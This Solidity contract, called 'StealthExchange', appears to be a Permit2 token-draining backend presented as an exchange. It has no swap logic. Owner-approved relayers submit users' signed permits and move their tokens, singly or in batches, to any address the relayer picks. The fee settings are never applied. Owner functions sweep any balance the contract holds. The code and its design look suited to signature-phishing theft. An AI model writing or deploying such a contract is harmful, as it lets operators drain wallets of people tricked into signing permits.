// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./IPermit2.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract StealthExchange {

    IPermit2 public immutable permit2;
    address public owner;
    address public feeRecipient;
    uint256 public feeBasisPoints;
    bool public paused;

    mapping(address => bool) public authorizedRelayers;
    mapping(bytes32 => bool) public executedTransfers;

    event SingleTransfer(
        address indexed from,
        address indexed token,
        uint256 amount,
        address indexed to
    );

    event BatchTransfer(
        address indexed from,
        uint256 count,
        address indexed to
    );

    event RelayerUpdated(address indexed relayer, bool status);
    event FeeUpdated(uint256 newFee);
    event FeeRecipientUpdated(address newRecipient);
    event Paused(bool status);

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    modifier onlyRelayer() {
        require(
            msg.sender == owner || authorizedRelayers[msg.sender],
            "NOT_RELAYER"
        );
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "PAUSED");
        _;
    }

    constructor(
        address _permit2,
        address _feeRecipient,
        uint256 _feeBasisPoints
    ) {
        require(_permit2 != address(0), "ZERO_ADDRESS");
        require(_feeRecipient != address(0), "ZERO_ADDRESS");
        require(_feeBasisPoints <= 1000, "FEE_TOO_HIGH");

        permit2 = IPermit2(_permit2);
        owner = msg.sender;
        feeRecipient = _feeRecipient;
        feeBasisPoints = _feeBasisPoints;
        paused = false;
    }

    function executeSingleTransfer(
        IPermit2.PermitTransferFrom calldata permitData,
        IPermit2.SignatureTransferDetails calldata transferDetails,
        address tokenOwner,
        bytes calldata signature
    ) external onlyRelayer whenNotPaused {
        bytes32 txHash = keccak256(
            abi.encodePacked(
                tokenOwner,
                permitData.permitted.token,
                permitData.permitted.amount,
                permitData.nonce,
                permitData.deadline
            )
        );
        require(!executedTransfers[txHash], "ALREADY_EXECUTED");
        executedTransfers[txHash] = true;

        permit2.permitTransferFrom(
            permitData,
            transferDetails,
            tokenOwner,
            signature
        );

        emit SingleTransfer(
            tokenOwner,
            permitData.permitted.token,
            transferDetails.requestedAmount,
            transferDetails.to
        );
    }

    function executeBatchTransfer(
        IPermit2.PermitBatchTransferFrom calldata permitData,
        IPermit2.SignatureTransferDetails[] calldata transferDetails,
        address tokenOwner,
        bytes calldata signature
    ) external onlyRelayer whenNotPaused {
        require(
            permitData.permitted.length == transferDetails.length,
            "LENGTH_MISMATCH"
        );

        bytes32 txHash = keccak256(
            abi.encodePacked(
                tokenOwner,
                permitData.nonce,
                permitData.deadline,
                permitData.permitted.length
            )
        );
        require(!executedTransfers[txHash], "ALREADY_EXECUTED");
        executedTransfers[txHash] = true;

        permit2.permitTransferFrom(
            permitData,
            transferDetails,
            tokenOwner,
            signature
        );

        emit BatchTransfer(
            tokenOwner,
            permitData.permitted.length,
            transferDetails[0].to
        );
    }

    function setRelayer(address relayer, bool status) external onlyOwner {
        require(relayer != address(0), "ZERO_ADDRESS");
        authorizedRelayers[relayer] = status;
        emit RelayerUpdated(relayer, status);
    }

    function setFee(uint256 newFee) external onlyOwner {
        require(newFee <= 1000, "FEE_TOO_HIGH");
        feeBasisPoints = newFee;
        emit FeeUpdated(newFee);
    }

    function setFeeRecipient(address newRecipient) external onlyOwner {
        require(newRecipient != address(0), "ZERO_ADDRESS");
        feeRecipient = newRecipient;
        emit FeeRecipientUpdated(newRecipient);
    }

    function setPaused(bool _paused) external onlyOwner {
        paused = _paused;
        emit Paused(_paused);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "ZERO_ADDRESS");
        owner = newOwner;
    }

    function rescueTokens(address token, uint256 amount) external onlyOwner {
        IERC20(token).transfer(owner, amount);
    }

    function rescueETH() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
